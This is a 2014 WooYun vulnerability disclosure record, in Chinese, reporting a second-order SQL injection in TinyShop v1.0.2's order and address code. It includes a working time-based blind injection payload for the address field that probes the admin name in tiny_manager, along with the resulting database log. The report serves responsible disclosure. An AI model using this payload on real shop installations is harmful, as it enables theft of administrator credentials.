{"id": 53823, "wybug_id": "wooyun-2014-066397", "wybug_title": "TinyShop二次注入一枚。", "wybug_corp": "tinyrise.com", "wybug_author": "roker", "wybug_date": "2014-07-09 16:51", "wybug_open_date": "2014-10-07 16:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-07：\t细节向公众公开  简要描述： rtTinyShop v1.0.2 详细说明：  还是 protected\\controllers\\simple.php文件\npublic function order_act(){.................$address = $model->table(\"address\")->where(\"id=$address_id\")->find();            //if(!$address)$this->redirect(\"order\",false,Req::args());            //if(!$payment_id)$this->redirect(\"order\",false,Req::args()); $data['order_no'] = Common::createOrderNo();            .............           $data['addr'] = $address['addr'];//因为有字符限制 ，所以选择这个参数入            ..........            //var_dump($order_products);exit();            //写入订单数据            $order_id = $model->table(\"order\")->data($data)->insert();\n看到 \npublic function address_save(){        $rules = array('zip:zip:邮政编码格式不正确!','addr:required:内容不能为空！','accept_name:required:收货人姓名不能为空!,mobile:mobi:手机格式不正确!,phone:phone:电话格式不正确');        $info = Validator::check($rules);                if(!is_array($info) && $info==true) {\\\\            Filter::form(array('sql'=>'accept_name|mobile|phone','txt'=>'addr','int'=>'province|city|county|zip|is_default|id'));\n会把单引号转义为 斜杠+'. 但是进入数据库时 斜杠 是不会进去的。从而造成二次注入。延时注入测试下。首先 添加个收货地址，抓包修改 addr=','111111',49,12.00,12.00,'2014-06-27 09:33:13','',0,'0',0,0,52,40,0,1,0,if(ascii(substr((select name from tiny_manager),1,1))-96,sleep(2),null))#\n\n用生成的地址 提交订单。看mysql执行日志，可以看到insert into tiny_order (`prom`,`prom_id`,`order_no`,`user_id`,`payment`,`status`,`pay_status`,`accept_name`,`phone`,`mobile`,`province`,`city`,`county`,`addr`,`zip`,`payable_amount`,`payable_freight`,`real_freight`,`create_time`,`user_remark`,`is_invoice`,`invoice_title`,`taxes`,`discount_amount`,`order_amount`,`real_amount`,`point`,`type`,`voucher_id`,`voucher`) values ('a:11:{s:2:\"id\";s:1:\"2\";s:8:\"goods_id\";s:2:\"24\";s:5:\"title\";s:49:\"2014春装男款格子长袖男衬衫大型团购\";s:7:\"max_num\";s:2:\"50\";s:7:\"min_num\";s:1:\"1\";s:5:\"price\";s:5:\"30.00\";s:10:\"start_time\";s:19:\"2014-05-04 10:18:00\";s:8:\"end_time\";s:19:\"2014-05-30 10:18:00\";s:9:\"goods_num\";s:1:\"0\";s:9:\"order_num\";s:1:\"0\";s:6:\"is_end\";s:1:\"0\";}',2,'20140627115409355844',2,1,2,0,'aaa','1111111111','1111111111',130000,130300,130302,'','111111',49,12.00,12.00,'2014-06-27 09:33:13','',0,'0',0,0,52,40,0,1,0,if(ascii(substr((select name from tiny_manager),1,1))-96,sleep(2),null))#','111111',49,10.00,10.00,'2014-06-27 11:54:09','',0,'0',0,0,40,30,0,1,0,'a:0:{}')#将后面的注释掉，所以实际执行的为\n\n 延时成功。可以写个脚本跑下密码。这里就不提供了~   漏洞证明：  \n\n   修复方案：  修复~祝厂商安全性越来越好~~   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-07-11 08:19 厂商回复： 非常感谢您为TinyShop信息安全做的贡献我们将尽快修复,非常感谢您的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}